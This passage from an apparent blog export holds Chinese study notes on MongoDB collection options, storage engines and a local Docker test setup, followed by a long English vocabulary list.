示例值：见下文</span><br><span class="hljs-string">8. collation：</span><br><span class="hljs-string">    1. 指定集合的默认排序规则。</span><br><span class="hljs-string">    2. 示例值：collation: &#123; locale: &quot;</span>en<span class="hljs-string">&quot;, strength: 2 &#125;</span><br><span class="hljs-string">2. 示例：</span><br><span class="hljs-string">db.createCollection(&quot;</span>myComplexCollection<span class="hljs-string">&quot;, &#123;</span><br><span class="hljs-string">  capped: true,</span><br><span class="hljs-string">  size: 10485760,</span><br><span class="hljs-string">  max: 5000,</span><br><span class="hljs-string">  validator: &#123; $jsonSchema: &#123;</span><br><span class="hljs-string">    bsonType: &quot;</span>object<span class="hljs-string">&quot;,</span><br><span class="hljs-string">    required: [&quot;</span>name<span class="hljs-string">&quot;, &quot;</span>email<span class="hljs-string">&quot;],</span><br><span class="hljs-string">    properties: &#123;</span><br><span class="hljs-string">      name: &#123;</span><br><span class="hljs-string">        bsonType: &quot;</span><span class="hljs-built_in">string</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">        description: &quot;</span>必须为字符串且为必填项<span class="hljs-string">&quot;</span><br><span class="hljs-string">      &#125;,</span><br><span class="hljs-string">      email: &#123;</span><br><span class="hljs-string">        bsonType: &quot;</span><span class="hljs-built_in">string</span><span class="hljs-string">&quot;,</span><br><span class="hljs-string">        pattern: &quot;</span>^.+@.+$<span class="hljs-string">&quot;,</span><br><span class="hljs-string">        description: &quot;</span>必须为有效的电子邮件地址<span class="hljs-string">&quot;</span><br><span class="hljs-string">      &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">  &#125;&#125;,</span><br><span class="hljs-string">  validationLevel: &quot;</span>strict<span class="hljs-string">&quot;,</span><br><span class="hljs-string">  validationAction: &quot;</span>erro<span class="hljs-string">r&quot;,</span><br><span class="hljs-string">  storageEngine: &#123;</span><br><span class="hljs-string">    wiredTiger: &#123; configString: &quot;</span>block_compressor=zstd<span class="hljs-string">&quot; &#125;</span><br><span class="hljs-string">  &#125;,</span><br><span class="hljs-string">  collation: &#123; locale: &quot;</span>en<span class="hljs-string">&quot;, strength: 2 &#125;</span><br><span class="hljs-string">&#125;);</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果未使用 use 命令切换到其他数据库，则会默认使用 test 数据库</li><li><code>db</code> 代表当前数据库</li></ol></blockquote><hr><h6 id="validator"><a href="#validator" class="headerlink" title="validator"></a>validator</h6><hr><h6 id="storageEngine"><a href="#storageEngine" class="headerlink" title="storageEngine"></a>storageEngine</h6><hr><h6 id="collation"><a href="#collation" class="headerlink" title="collation"></a>collation</h6><hr><h5 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a>删除集合</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">db</span>.collection.<span class="hljs-keyword">drop</span>()<br></code></pre></td></tr></table></figure><hr><h5 id="修改集合"><a href="#修改集合" class="headerlink" title="修改集合"></a>修改集合</h5><hr><h5 id="查询集合"><a href="#查询集合" class="headerlink" title="查询集合"></a>查询集合</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># 1. 查看当前使用的数据库所有集合</span><br><span class="hljs-keyword">show</span> collections<br></code></pre></td></tr></table></figure><hr><h4 id="文档操作"><a href="#文档操作" class="headerlink" title="文档操作"></a>文档操作</h4><p>&#x3D;&#x3D;1.插入文档&#x3D;&#x3D;</p><p>2.删除文档</p><p>3.修改文档</p><p>4.查询文档</p><h3 id="MongoDB-存储引擎"><a href="#MongoDB-存储引擎" class="headerlink" title="MongoDB 存储引擎"></a>MongoDB 存储引擎</h3><table><thead><tr><th><strong>引擎</strong></th><th><strong>特点</strong></th><th><strong>适合场景</strong></th><th><strong>当前状况</strong></th></tr></thead><tbody><tr><td><strong>WiredTiger（默认）</strong></td><td>- 文档级并发控制<br>- 支持 zlib、snappy、zstd 等多种压缩，节省磁盘空间<br>- 支持多文档事务<br>- 可配置缓存大小</td><td>日常生产环境、对并发和事务有要求的应用，既要性能又要稳定</td><td>MongoDB 默认引擎，功能强大，适合大多数场景，最推荐</td></tr><tr><td><strong>MMAPv1（废弃）</strong></td><td></td><td></td><td>自 MongoDB 4.0 起已废弃，不再维护，不推荐使用</td></tr><tr><td><strong>In-Memory</strong></td><td>- 数据完全保存在内存中，读写极快，但重启丢失所有数据</td><td></td><td>直接上 Redis</td></tr><tr><td><strong>Encrypted</strong></td><td>- 基于 WiredTiger，是其增强版本<br>- 支持数据文件加密</td><td>适用于对数据安全有要求的场景（如金融、医疗、政府等）</td><td>对安全要求高的场景强烈推荐使用</td></tr></tbody></table><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="单机测试环境搭建"><a href="#单机测试环境搭建" class="headerlink" title="单机测试环境搭建"></a>单机测试环境搭建</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run --rm -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --name secure-mongo <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">27017</span>:<span class="hljs-number">27017</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e MONGO_INITDB_ROOT_USERNAME=admin <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e MONGO_INITDB_ROOT_PASSWORD=wq666666 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  mongo:latest<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>非关系型数据库</category>
      
      <category>文档型</category>
      
      <category>MongoDB</category>
      
      <category>MongoDB 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：一级单词</title>
    <link href="/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%80%E7%BA%A7%E5%8D%95%E8%AF%8D/"/>
    <url>/2025/05/15/%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%B8%80%E7%BA%A7%E5%8D%95%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<ol><li>triumph</li><li>bother</li><li>religious</li><li>conjunction</li><li>statue</li><li>adapt</li><li>status</li><li>state</li><li>remedy</li><li>vocabulary</li><li>visualize</li><li>exhibition</li><li>exhibit</li><li>inhibition</li><li>durable</li><li>inhibitant</li><li>permanent</li><li>parliament</li><li>prominent</li><li>season</li><li>reason</li><li>phenomenon</li><li>prince</li><li>princess</li><li>price</li><li>loosen</li><li>tap</li><li>sip</li><li>dip</li><li>lip</li><li>vulnerable</li><li>convey</li><li>convert</li><li>province</li><li>convince</li><li>convenience</li><li>reside</li><li>resident</li><li>employ</li><li>expolit</li><li>employee</li><li>employer</li><li>preserve</li><li>transmitter</li><li>prison</li><li>result</li><li>principle</li><li>principal</li><li>save</li><li>slip</li><li>textile</li><li>forge</li><li>exhaust</li><li>enthusiasm</li><li>extinguish</li><li>explode</li><li>explore</li><li>scatter</li><li>material</li><li>mineral</li><li>marital</li><li>matter</li><li>territory</li><li>tunnel</li><li>channel</li><li>opponent</li><li>highlight</li><li>incentive</li><li>consult</li><li>respect</li><li>diligence</li><li>deceive</li><li>priority</li><li>infect</li><li>defect</li><li>affect</li><li>cliff</li><li>puzzle</li><li>dioxide</li><li>snack</li><li>cultivate</li><li>alter</li><li>alert</li><li>record</li><li>recoder</li><li>accumulation</li><li>acceleration</li><li>surge</li><li>surgery</li><li>survery</li><li>surgeon</li><li>urge</li><li>verge</li><li>investment</li><li>opt</li><li>apt</li><li>transform</li><li>restrict</li><li>strict</li><li>district</li><li>massive</li><li>platntation</li><li>liquid</li><li>fluid</li><li>solid</li><li>billion</li><li>million</li><li>hundred</li><li>thousand</li><li>hinder</li><li>wrinkle</li><li>wrist</li><li>wreck</li><li>mill</li><li>pill</li><li>artificial</li><li>artical</li><li>artistic</li><li>exceptional</li><li>expectation</li><li>exception</li><li>exclusion</li><li>acid</li><li>amid</li><li>accord</li><li>pretend</li><li>prevent</li><li>present</li><li>protect</li><li>protest</li><li>patent</li><li>previous</li><li>therapeutical</li><li>theoretical</li><li>theatical</li><li>creature</li><li>scene</li><li>scenery</li><li>philosophy</li><li>chemistry</li><li>biology</li><li>physics</li><li>psychology</li><li>production</li><li>productive</li><li>product</li><li>prove</li><li>reception</li><li>precise</li><li>retailer</li><li>figurative</li><li>uncover</li><li>insistent</li><li>recover</li><li>plan</li><li>plain</li><li>plane</li><li>lane</li><li>grain</li><li>explain</li><li>mister</li><li>mist</li><li>transfer</li><li>spiritual</li><li>sport</li><li>outlet</li><li>dismiss</li><li>category</li><li>catalogue</li><li>dialogue</li><li>directory</li><li>tutor</li><li>sympathetic</li><li>being</li><li>doctoral</li><li>doctor</li><li>irrigate</li><li>odd</li><li>promote</li><li>remote</li><li>deliver</li><li>contrary</li><li>term</li><li>manufacturer</li><li>manufacture</li><li>attract</li><li>attack</li><li>abstract</li><li>illusion</li><li>mayor</li><li>carbon</li><li>routine</li><li>transporation</li><li>mechanic</li><li>pour</li><li>poor</li><li>sour</li><li>batch</li><li>counterpart</li><li>resemblance</li><li>approve</li><li>session</li><li>supervise</li><li>isolate</li><li>presentation</li><li>representation</li><li>impact</li><li>effect</li><li>effective</li><li>riot</li><li>demonstrate</li><li>powder</li><li>power</li><li>pond</li><li>pound</li><li>interpretation</li><li>intervention</li><li>interference</li><li>advertise</li><li>distribute</li><li>oasis</li><li>mainland</li><li>engage</li><li>imagine</li><li>imitation</li><li>continent</li><li>commitment</li><li>commit</li><li>internation</li><li>stage</li><li>considered</li><li>indestructible</li><li>destruct</li><li>destruction</li><li>toxic</li><li>compose</li><li>decompose</li><li>cool</li><li>sample</li><li>compound</li><li>derive</li><li>drive</li><li>pollution</li><li>stimulate</li><li>simulated</li><li>degraded</li><li>Left</li><li>detect</li><li>bottles</li><li>while</li><li>suspect</li><li>cancer</li><li>law</li><li>reform</li><li>interface</li><li>reformation</li><li>furniture</li><li>future</li><li>fortune</li><li>consitute</li><li>previal</li><li>privilege</li><li>currency</li><li>annual</li><li>assign</li><li>induce</li><li>costume</li><li>customer</li><li>consumer</li><li>royal</li><li>recall</li><li>lamp</li><li>damp</li><li>camp</li><li>loyal</li><li>rural</li><li>overseas</li><li>grant</li><li>grand</li><li>giant</li><li>saint</li><li>spouse</li><li>sponsor</li><li>orientaion</li><li>noble</li><li>conscious</li><li>award</li><li>aware</li><li>ward</li><li>reward</li><li>awkward</li><li>personality</li><li>crucial</li><li>migration</li><li>immigration</li><li>suspend</li><li>technique</li><li>span</li><li>bracket</li><li>steamer</li><li>steam</li><li>pot</li><li>reference</li><li>trace</li><li>veteran</li><li>nursery</li><li>possession</li><li>temple</li><li>template</li><li>greeting</li><li>dose</li><li>curtain</li><li>clarification</li><li>contend</li><li>content</li><li>consent</li><li>extend</li><li>extent</li><li>perceive</li><li>perception</li><li>motivation</li><li>given</li><li>grasp</li><li>grab</li><li>grip</li><li>council</li><li>realm</li><li>contemporary</li><li>temporary</li><li>audience</li><li>phrase</li><li>phase</li><li>verbal</li><li>irony</li><li>studio</li><li>suit</li><li>apartment</li><li>accomplish</li><li>senior</li><li>sensor</li><li>rubber</li><li>entitle</li><li>frustration</li><li>qualification</li><li>replacement</li><li>placement</li><li>debtor</li><li>emission</li><li>resolve</li><li>revolve</li><li>involve</li><li>evolve</li><li>refrain</li><li>intermediary</li><li>substantial</li><li>sustainable</li><li>accommodation</li><li>accompany</li><li>clockwise</li><li>dozen</li><li>curriculum</li><li>datum</li><li>entrance</li><li>enhance</li><li>lack</li><li>consequently</li><li>political</li><li>literary</li><li>literacy</li><li>attach</li><li>bypass</li><li>approach</li><li>decrease</li><li>increase</li><li>pratical</li><li>colleague</li><li>college</li><li>documentary</li><li>trap</li><li>wrap</li><li>applicant</li><li>application</li><li>beverage</li><li>reap</li><li>smash</li><li>sector</li><li>firm</li><li>farm</li><li>primitive</li><li>provision</li><li>supply</li><li>guilty</li><li>guilt</li><li>commerce</li><li>commence</li><li>comment</li><li>command</li><li>protein</li><li>substitute</li><li>biotechnology</li><li>ecology</li><li>substance</li><li>legislation</li><li>goose</li><li>legal</li><li>dim</li><li>resistant</li><li>virtually</li><li>antique</li><li>policy</li><li>visually</li><li>exemplify</li><li>idealistic</li><li>occupant</li><li>quarrelsome</li><li>methodical</li><li>pinch</li><li>elective</li><li>imperialism</li><li>shed</li><li>advantage</li><li>materialize</li><li>element</li><li>rope</li><li>harsh</li><li>peasant</li><li>scholar</li><li>democratic</li><li>rally</li><li>verfication</li><li>certification</li><li>classification</li><li>halt</li><li>pause</li><li>album</li><li>peculiarity</li><li>pub</li><li>hub</li><li>humbly</li><li>essayist</li><li>thunder</li><li>keen</li><li>hail</li><li>police</li><li>accident</li><li>academic</li><li>campaign</li><li>spark</li><li>bark</li><li>indoor</li><li>flexible</li><li>endure</li><li>ensure</li><li>collaborate</li><li>hence</li><li>ethnic</li><li>confident</li><li>confidence</li><li>property</li><li>integrate</li><li>bold</li><li>blod</li><li>era</li><li>sensitive</li><li>tender</li><li>architect</li><li>architecture</li><li>circular</li><li>forth</li><li>reflect</li><li>rage</li><li>assume</li><li>atmosphere</li><li>environment</li><li>badge</li><li>enrich</li><li>innovation</li><li>instrument</li><li>instrumental</li><li>feasible</li><li>resign</li><li>resignation</li><li>triangular</li><li>shallow</li><li>hollow</li><li>flee</li><li>cheat</li><li>retirement</li><li>declaration</li><li>entire</li><li>rent</li><li>hire</li><li>deem</li><li>cast</li><li>delicate</li><li>depression</li><li>dedicate</li><li>infant</li><li>exclamation</li><li>exclaim</li><li>raw</li><li>row</li><li>bacteria</li><li>confine</li><li>conceal</li><li>miracle</li><li>leisure</li><li>ashore</li><li>devil</li><li>cosmic</li><li>gracious</li><li>leading</li><li>lens</li><li>rack</li><li>confess</li><li>drain</li><li>immense</li><li>immediate</li><li>fertile</li><li>deficiency</li><li>blade</li><li>technician</li><li>comparable</li><li>undertaking</li><li>torture</li><li>tedious</li><li>supper</li><li>funeral</li><li>avivation</li><li>fiction</li><li>withdraw</li><li>jail</li><li>prospective</li><li>prospect</li><li>formulate</li><li>liberate</li><li>bankrupt</li><li>ally</li><li>enlighten</li><li>excess</li><li>crash</li><li>altitude</li><li>rhythm</li><li>drastic</li><li>narration</li><li>scheme</li><li>modest</li><li>compromise</li><li>lest</li><li>sheer</li><li>perfect</li><li>perfection</li><li>jealousy</li><li>critical</li><li>recession</li><li>bearing</li><li>crew</li><li>attribute</li><li>insight</li><li>marvelous</li><li>facilitate</li><li>superior</li><li>positive</li><li>evaluate</li><li>perspective</li><li>vary</li><li>furthermore</li><li>significant</li><li>warfare</li><li>ribbon</li><li>faculty</li><li>glue</li><li>crime</li><li>spur</li><li>shady</li><li>provoke</li><li>gardener</li><li>scar</li><li>scare</li><li>scarcity</li><li>overhear</li><li>influential</li><li>conference</li><li>plunge</li><li>correspondent</li><li>noticeable</li><li>magnetic</li><li>committee</li><li>timber</li><li>bulb</li><li>tide</li><li>vapour</li><li>accordance</li><li>analytic</li><li>burial</li><li>journal</li><li>offensive</li><li>electronic</li><li>subtract</li><li>bury</li><li>treaty</li><li>compensation</li><li>imitate</li><li>chase</li><li>amateur</li><li>simplify</li><li>pregnant</li><li>resolution</li><li>advantageous</li><li>efficient</li><li>melt</li><li>institution</li><li>margin</li><li>treatment</li><li>equivalent</li><li>publicity</li><li>competitor</li><li>collapse</li><li>process</li><li>promotion</li><li>disastrous</li><li>manual</li><li>marsh</li><li>mixer</li><li>violation</li><li>climate</li><li>debt</li><li>Marxist</li><li>fence</li><li>refinery</li><li>hip</li><li>stride</li><li>shiver</li><li>division</li><li>revision</li><li>revelation</li><li>dye</li><li>reluctant</li><li>improvement</li><li>shaver</li><li>bubble</li><li>banner</li><li>splash</li><li>cabin</li><li>backward</li><li>periodic</li><li>situate</li><li>dump</li><li>obtain</li><li>virtue</li><li>inquiry</li><li>bond</li><li>affection</li><li>proportion</li><li>worthless</li><li>grassy</li><li>civilian</li><li>define</li><li>crack</li><li>discipline</li><li>negative</li><li>comparison</li><li>grave</li><li>roller</li><li>peril</li><li>reduction</li><li>instantaneous</li><li>defiant</li><li>defiance</li><li>permission</li><li>beggar</li><li>chin</li><li>punch</li><li>preferable</li><li>terminal</li><li>instruct</li><li>Christian</li><li>liberal</li><li>luxury</li><li>withstand</li><li>proverb</li><li>jewel</li><li>lick</li><li>addition</li><li>species</li><li>specimen</li><li>attorney</li><li>lag</li><li>universal</li><li>cruise</li></ol><hr><ol start="690"><li>vigorous</li><li>underline</li><li>resolute</li><li>relation</li><li>barrel</li><li>interfere</li><li>burden</li><li>acknowledge</li><li>candidate</li><li>reverse</li><li>notable</li><li>desperate</li><li>voluntary</li><li>automobile</li><li>dialect</li><li>gaze</li><li>doom</li><li>toss</li><li>balcony</li><li>energetic</li><li>embassy</li><li>sincere</li><li>axis</li><li>conservative</li><li>lump</li><li>hole</li><li>pole</li><li>disgust</li><li>guideline</li><li>corridor</li><li>singular</li><li>suburb</li><li>petty</li><li>exaggerate</li><li>voltage</li><li>gratitude</li><li>strap</li><li>applause</li><li>slap</li><li>experimental</li><li>assignment</li><li>resent</li><li>fatigue</li><li>diameter</li><li>horror</li><li>predict</li><li>derivation</li><li>apparent</li><li>apparatus</li><li>recommend</li><li>purify</li><li>parade</li><li>harmonious</li><li>fantastic</li><li>excel</li><li>spontaneous</li><li>decay</li><li>misteress</li><li>fellowship</li><li>revenue</li><li>jungle</li><li>facility</li><li>cashier</li><li>inference</li><li>penetrate</li><li>temper</li><li>rub</li><li>obedience</li><li>flock</li><li>motel</li><li>poll</li><li>reproduction</li><li>interact</li><li>nerve</li><li>underneath</li><li>stationary</li><li>marvel</li><li>membership</li><li>miss</li><li>sticky</li><li>headquarters</li><li>shell</li><li>incredible</li><li>drainage</li><li>dumb</li><li>gesture</li><li>cable</li><li>proficient</li><li>indispensable</li><li>intent</li><li>instruction</li><li>tray</li><li>procedure</li><li>heading</li><li>sauce</li><li>boundary</li><li>troop</li><li>offend</li><li>ornament</li><li>morality</li><li>trial</li></ol><hr><ol start="791"><li>obedient</li><li>obey</li><li>crawl</li><li>nuisance</li><li>impress</li><li>novelty</li><li>responsible</li><li>cruelty</li><li>obligation</li><li>crown</li><li>determine</li><li>faithful</li><li>dairy</li><li>immigrant</li><li>ratio</li><li>municipal</li><li>bargain</li><li>complication</li><li>transmission</li><li>relative</li><li>stem</li><li>famine</li><li>fundamental</li><li>pledge</li><li>personnel</li><li>wagon</li><li>provided</li><li>exclude</li><li>overnight</li><li>superb</li><li>specific</li><li>connexion</li><li>industrialize</li><li>emit</li><li>advocate</li><li>entertain</li><li>mature</li><li>coverage</li><li>exceed</li><li>dominant</li><li>stale</li><li>reunion</li><li>fascinate</li><li>handy</li><li>ounce</li><li>heritage</li><li>indifferent</li><li>beforehand</li><li>hostile</li><li>spite</li><li>integrity</li><li>mislead</li><li>applicable</li><li>mild</li><li>clap</li><li>accuse</li><li>formation</li><li>bound</li><li>fossil</li><li>maintenance</li><li>exile</li><li>dock</li><li>chop</li><li>aviation</li><li>eternal</li><li>underestimate</li><li>bid</li><li>semester</li><li>wrack</li><li>deliberate</li><li>moisture</li><li>rib</li><li>infectious</li><li>paw</li><li>vanish</li><li>bachelor</li><li>damn</li><li>standpoint</li><li>stain</li><li>workshop</li><li>quarterly</li><li>atomic</li><li>realistic</li><li>virtual</li><li>breed</li><li>intense</li><li>authority</li><li>politics</li><li>couch</li><li>conclusion</li><li>haste</li><li>prevalent</li><li>plague</li><li>identification</li><li>likelihood</li><li>clue</li><li>perserve</li><li>trigger</li><li>governor</li><li>civilize</li><li>objection</li><li>assemble</li><li>rare</li></ol><hr><ol start="894"><li>exterior</li><li>credit</li><li>visible</li><li>circumstance</li><li>fatal</li><li>restore</li><li>joint</li><li>liable</li><li>delegate</li><li>condemn</li><li>soak</li><li>victim</li><li>dramatic</li><li>parallel</li><li>compel</li><li>thermometer</li><li>periodical</li><li>lodge</li><li>capable</li><li>champion</li><li>organism</li><li>prohibition</li><li>descend</li><li>sway</li><li>capture</li><li>diagram</li><li>drip</li><li>steer</li><li>gum</li><li>lord</li><li>discharge</li><li>formula</li><li>valid</li><li>compatible</li><li>suspicious</li><li>frame</li><li>upright</li><li>whatsoever</li><li>mighty</li><li>vocation</li><li>vague</li><li>gasoline</li><li>formal</li><li>subsequent</li><li>validity</li><li>scope</li><li>capacity</li><li>uneasy</li><li>complicate</li><li>stuffy</li><li>terrorist</li><li>summit</li><li>unemployment</li><li>heir</li><li>cautious</li><li>forehead</li><li>poverty</li><li>consume</li><li>successive</li><li>invade</li><li>stake</li><li>tragedy</li><li>forthcoming</li><li>jury</li><li>panic</li><li>ballet</li><li>conflict</li><li>executive</li><li>gossip</li><li>characteristic</li><li>particularly</li><li>omit</li><li>dispose</li><li>multiply</li><li>innocent</li><li>strategic</li><li>baseball</li><li>fluctuate</li><li>glow</li><li>endurance</li><li>calendar</li><li>slender</li><li>investigate</li></ol><hr><ol start="977"><li>route</li><li>naturally</li><li>attempt</li><li>disguise</li><li>arise</li><li>accurate</li><li>intelligence</li><li>evil</li><li>carrier</li><li>rod</li><li>eliminate</li><li>consist</li><li>conquest</li><li>pierce</li><li>container</li><li>establishment</li><li>arouse</li><li>nonsense</li><li>curve</li><li>liability</li><li>lease</li><li>orientation</li><li>gear</li><li>paragraph</li><li>evolution</li><li>modification</li><li>influence</li><li>admission</li><li>collective</li><li>core</li><li>horizontal</li><li>mission</li><li>shrug</li><li>donation</li><li>unity</li><li>lean</li><li>input</li><li>continental</li><li>deposit</li><li>cue</li><li>plastic</li><li>oral</li><li>microscopic</li><li>negotiate</li><li>motorway</li><li>convention</li><li>flourish</li><li>electronics</li><li>sting</li><li>appearance</li><li>pitch</li><li>motion</li><li>veil</li><li>millimetre</li><li>indicative</li><li>farewell</li><li>fruitful</li><li>copper</li><li>stock</li><li>gross</li><li>behave</li><li>revolutionary</li><li>awful</li><li>mount</li><li>simplicity</li><li>hut</li><li>preface</li><li>discard</li><li>intensity</li><li>volt</li><li>attachment</li><li>definite</li><li>depress</li><li>initial</li><li>brass</li><li>distinction</li><li>astonishment</li><li>pray</li><li>retreat</li><li>magnificent</li><li>elevation</li><li>depart</li><li>locality</li><li>transaction</li><li>corporation</li><li>forbid</li><li>determination</li><li>accent</li><li>counter</li><li>receipt</li><li>refine</li><li>revise</li><li>mess</li><li>intelligent</li><li>barely</li><li>fright</li><li>occasion</li><li>frequent</li><li>thorough</li><li>namely</li><li>absent</li><li>utility</li><li>reliable</li><li>undergraduate</li><li>sensible</li><li>vacuum</li><li>onward</li><li>agriculture</li><li>stability</li><li>violence</li><li>observe</li><li>rival</li><li>desirable</li><li>bullet</li><li>reinforce</li><li>sight</li><li>implement</li><li>mutual</li><li>deadly</li><li>breakdown</li><li>regulate</li><li>coarse</li><li>grin</li><li>exert</li><li>decorate</li><li>resemble</li><li>extension</li><li>suffer</li><li>shelter</li><li>industrial</li><li>meantime</li><li>hindrance</li><li>conqueror</li><li>measurement</li><li>embarrass</li><li>squeeze</li><li>administration</li><li>speculate</li><li>dimension</li><li>inspect</li><li>sorrowful</li><li>quantitative</li><li>reckon</li><li>troublesome</li><li>lobby</li><li>instinct</li><li>assumption</li><li>disappearance</li><li>devise</li><li>imply</li><li>crush</li><li>neglect</li><li>charter</li><li>usage</li><li>pessimistic</li><li>clip</li><li>aerial</li><li>boost</li><li>cart</li><li>surplus</li><li>minus</li><li>inflation</li><li>thrive</li><li>polish</li><li>alternative</li><li>spill</li><li>sympathize</li><li>mathematical</li><li>jeans</li><li>dirt</li><li>patch</li><li>upward</li><li>hospitality</li><li>roast</li><li>incidence</li><li>correspondence</li><li>radar</li><li>fearful</li><li>imaginary</li><li>senator</li><li>motivate</li><li>misfortune</li></ol><hr><ol start="1159"><li>genuine</li><li>fuss</li><li>cereal</li><li>strive</li><li>transportation</li><li>merit</li><li>thereby</li><li>bible</li><li>confirmation</li><li>decisive</li><li>venture</li><li>writing</li><li>sphere</li><li>appoint</li><li>cherish</li><li>downward</li><li>preference</li><li>respectively</li><li>persistence</li><li>settle</li><li>fairly</li><li>republican</li><li>secondary</li><li>fierce</li><li>register</li><li>pillar</li><li>monster</li><li>elevator</li><li>heap</li><li>prejudice</li><li>motive</li><li>refreshment</li><li>appeal</li><li>pat</li><li>resistance</li><li>peculiar</li><li>metric</li><li>quote</li><li>congress</li><li>hint</li><li>intend</li><li>emphasis</li><li>appointment</li><li>wander</li><li>diligent</li><li>superiority</li><li>historic</li><li>cement</li><li>notion</li><li>dominate</li><li>ghost</li><li>reserve</li><li>maiden</li><li>presently</li><li>veto</li><li>plentiful</li><li>bait</li><li>scandal</li><li>nightmare</li><li>pad</li><li>curse</li><li>inquire</li><li>density</li><li>hay</li><li>outset</li><li>myth</li><li>metallic</li><li>inevitable</li><li>preliminary</li><li>plantation</li><li>restrain</li><li>attendance</li><li>leap</li><li>employment</li><li>sophisticated</li><li>military</li><li>civil</li><li>laundry</li><li>explosive</li><li>justice</li><li>essence</li><li>whale</li><li>vision</li><li>entry</li><li>migrate</li><li>overtake</li><li>stir</li><li>partially</li><li>utilize</li><li>excitement</li><li>breeze</li><li>exchange</li><li>consumption</li><li>settlement</li><li>composer</li><li>vertical</li><li>plug</li><li>helpless</li><li>data</li><li>peak</li><li>rely</li><li>chip</li><li>object</li><li>supplement</li><li>reaction</li><li>finance</li><li>crisis</li><li>siege</li><li>constitution</li><li>consequent</li><li>flame</li><li>insurance</li><li>strip</li><li>triumphant</li><li>literal</li><li>abundance</li><li>confusion</li><li>infinity</li><li>feedback</li><li>roar</li><li>rescue</li><li>microphone</li><li>companion</li><li>log</li><li>overhead</li><li>definitely</li><li>paste</li><li>frank</li><li>canal</li><li>segment</li><li>admiration</li><li>shortage</li><li>customary</li><li>recovery</li><li>monument</li><li>gorgeous</li><li>dissolve</li><li>confront</li><li>ultimate</li><li>dealer</li><li>adoption</li><li>fashionable</li><li>compact</li><li>solidify</li><li>multiplication</li><li>horizon</li><li>gamble</li><li>locate</li><li>lavatory</li><li>dictate</li><li>regulation</li><li>interpret</li><li>elbow</li><li>repay</li><li>mathematics</li><li>comedy</li><li>originate</li><li>alongside</li><li>conclude</li><li>ambition</li><li>execution</li><li>spoil</li><li>prior</li><li>detection</li><li>scan</li><li>adventure</li><li>grief</li><li>primarily</li><li>stiff</li><li>orient</li><li>consolidate</li><li>bucket</li><li>bore</li><li>overwhelming</li><li>memorize</li><li>survey</li><li>optimism</li><li>draft</li><li>furnuiture</li><li>fortunate</li><li>aspect</li><li>expiation</li></ol><hr><ol start="1341"><li>tighten</li><li>utter</li><li>signature</li><li>superficial</li><li>acceptance</li><li>persist</li><li>van</li><li>conquer</li><li>religion</li><li>contrast</li><li>coherent</li><li>echo</li><li>persuasion</li><li>fragment</li><li>precision</li><li>occupation</li><li>lace</li><li>miserable</li><li>momentary</li><li>recreation</li><li>logic</li><li>commonplace</li><li>frequency</li><li>tendency</li><li>napkin</li><li>shortly</li><li>occurrence</li><li>reveal</li><li>invisible</li><li>handbook</li><li>generalize</li><li>aisle</li><li>projector</li><li>proceed</li><li>correspond</li><li>spacecraft</li><li>access</li><li>diverse</li><li>abundant</li><li>learning</li><li>election</li><li>competent</li><li>remark</li><li>decent</li><li>inward</li><li>prediction</li><li>monstrous</li><li>variable</li><li>insult</li><li>organic</li><li>await</li><li>generator</li><li>purity</li><li>precaution</li><li>consideration</li><li>reasonable</li><li>priest</li><li>warning</li><li>compete</li><li>linear</li><li>liter</li><li>constitute</li><li>folk</li><li>mortgage</li><li>condense</li><li>enquire</li><li>thesis</li><li>acute</li><li>swell</li><li>grace</li><li>auto</li><li>inform</li><li>rifle</li><li>approval</li><li>burst</li><li>sustain</li><li>notify</li><li>stripe</li><li>heroic</li><li>ornamental</li><li>toll</li><li>pace</li><li>hook</li><li>freight</li><li>banker</li><li>solar</li><li>precious</li><li>wit</li><li>suspicion</li><li>specialist</li><li>proposition</li><li>soften</li><li>passive</li><li>vacation</li><li>radical</li><li>sketch</li><li>briefcase</li><li>comprehension</li><li>formulation</li><li>startle</li><li>assure</li><li>definition</li><li>up-to-date</li><li>hearty</li><li>option</li><li>continuity</li><li>tremendous</li><li>gang</li><li>complaint</li><li>reject</li><li>strategy</li><li>sociology</li><li>landscape</li><li>ownership</li><li>mechanism</li><li>observer</li><li>alliance</li><li>dorm</li><li>trash</li><li>skeleton</li><li>straighten</li><li>herd</li><li>proper</li><li>watchful</li><li>deserve</li><li>contest</li><li>weave</li><li>recruit</li><li>goodness</li><li>spacious</li><li>romance</li><li>selection</li><li>monetary</li><li>gymnasium</li><li>practicable</li><li>soar</li><li>pack</li><li>marshal</li><li>critic</li><li>import</li><li>advisable</li><li>elevate</li><li>association</li><li>orbit</li><li>ore</li><li>descent</li><li>absorption</li><li>reproduce</li><li>slope</li><li>primary</li><li>dispute</li><li>gravity</li><li>spot</li><li>sack</li><li>layout</li><li>absorb</li><li>progressive</li><li>violent</li><li>independent</li><li>shrink</li><li>empire</li><li>submit</li><li>sacrifice</li><li>Christ</li><li>occur</li><li>fulfil</li><li>encounter</li>